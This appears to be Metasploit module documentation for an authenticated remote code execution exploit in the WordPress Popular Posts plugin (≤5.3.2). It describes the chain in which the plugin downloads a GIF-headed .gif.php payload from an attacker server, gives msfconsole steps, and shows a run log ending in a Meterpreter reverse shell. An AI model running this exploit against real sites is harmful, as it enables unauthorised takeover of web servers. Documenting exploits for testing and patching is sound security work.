## Vulnerable Application

This exploit leverages an authenticated improper input validation in Wordpress plugin Popular Posts <= 5.3.2.
The exploit chain is rather complicated.

Authentication is required and `gd` for PHP is required on the server.
Then the Popular Post plugin is reconfigured to allow for an arbitrary URL for the post image in the widget.
A post is made, then requests are sent to the post to make it more popular than the previous #1 by 5. Once
the post hits the top 5, and after a 60sec (we wait 90) server cache refresh, the homepage widget is loaded
which triggers the plugin to download the payload from our server.  Our payload has a `GIF` header, and a
double extension (`.gif.php`) allowing for arbitrary PHP code to be executed.

### Requirements

#### Server

* `gd` must be installed
* Must have a Popular Posts widget installed on the homepage

#### Client

* Authentication is required
* Authorization to create a post
* FQDN which does NOT resolve to a reserved address (192/172/10)
* Port 80/443/8080 must be open
* The ability to receive a `GET` and `HEAD` request

## Verification Steps

1. Install the plugin to wordpress
1. Start msfconsole
1. Do: `use exploits/multi/http/wp_popular_posts_rce`
1. Do: `set rhosts`
1. Do: `set username`
1. Do: `set password`
1. Do: `set SRVHOSTNAME`
1. Do: `set SRVPORT`
1. Do: `run`
1. You should get a shell.

## Options

### USERNAME

Username of the account which has post privileges. Defaults to `admin`.

### PASSWORD

Password of the account which has post privileges. Defaults to `admin`

### SRVHOSTNAME

FQDN of the metasploit server. Must not resolve to a reserved address (192/10/127/172).
[Ref](https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L560)

### SRVPORT

The local port to listen on. Must be `80`,`443`, or `8080`.
[Ref](https://github.com/WordPress/wordpress-develop/blob/5.8/src/wp-includes/http.php#L584)

## Scenarios

### Wordpress Popular Posts 5.3.2 on Wordpress 5.4.8 running on Ubuntu 20.04

```
[*] Processing popular.rb for ERB directives.
resource (popular.rb)> use exploits/multi/http/wp_popular_posts_rce
[*] Using configured payload php/meterpreter/reverse_tcp
resource (popular.rb)> set rhosts 2.2.2.2
rhosts => 2.2.2.2
resource (popular.rb)> set username admin
username => admin
resource (popular.rb)> set password admin
password => admin
resource (popular.rb)> set verbose true
verbose => true
resource (popular.rb)> set lhost 1.1.1.1
lhost => 1.1.1.1
resource (popular.rb)> set SRVHOST 1.1.1.1
SRVHOST => 1.1.1.1
resource (popular.rb)> set SRVPORT 8080
SRVPORT => 8080
resource (popular.rb)> set ReverseAllowProxy true
ReverseAllowProxy => true
resource (popular.rb)> set SRVHOSTNAME test.metasploit.com
SRVHOSTNAME => test.metasploit.com
resource (popular.rb)> run
[*] Started reverse TCP handler on 1.1.1.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking /wp-content/plugins/wordpress-popular-posts/readme.txt
[*] Found version 5.3.2 in the plugin
[+] The target appears to be vulnerable.
[*] Payload file name: 33pdOF.gif.php
[*] Checking if gd is installed
[*] Determining post with most views
[*] Top Views: 25
[*] Retrieving wpp_admin token
[*] wpp_admin_token: 77de9f26d8
[*] Updating popular posts settings for images
[*] Clearing image cache
[*] Creating new post
[*] ajax nonce: 62666b5377
[*] wp nonce: 6ec79a728b
[*] Created Post: 257
[*] Writing content to Post: 257
[*] Starting web server to handle request for image payload
[*] Using URL: http://1.1.1.1:8080/33pdOF.gif.php
[*] Adding malicious metadata for redirect to http://test.metasploit.com:8080/33pdOF.gif.php
[*] Sending 30 views to http://2.2.2.2/index.php/2021/12/06/mvihjvanh2eyo2n6b43wjxj16/
[*] Waiting 90sec for cache refresh by server
[*] Attempting to force loading of shell by visiting to homepage and loading the widget
[+] Responding to initial HEAD request (passed check 1)
[+] Responding to GET request (passed check 2)
[*] Triggering shell at: /wp-content/uploads/wordpress-popular-posts/257_33pdOF.gif.php in 10 seconds. Attempt 1 of 5
[*] Sending stage (39282 bytes) to 2.2.2.2
[+] Deleted 257_33pdOF.gif.php
[*] Meterpreter session 1 opened (1.1.1.1:4444 -> 2.2.2.2:38664 ) at 2021-12-05 19:05:57 -0500
[*] Server stopped.

meterpreter > getuid
Server username: www-data
meterpreter > sysinfo
Computer    : wordpress2004
OS          : Linux wordpress2004 5.4.0-90-generic #101-Ubuntu SMP Fri Oct 15 20:00:55 UTC 2021 x86_64
Meterpreter : php/linux
```
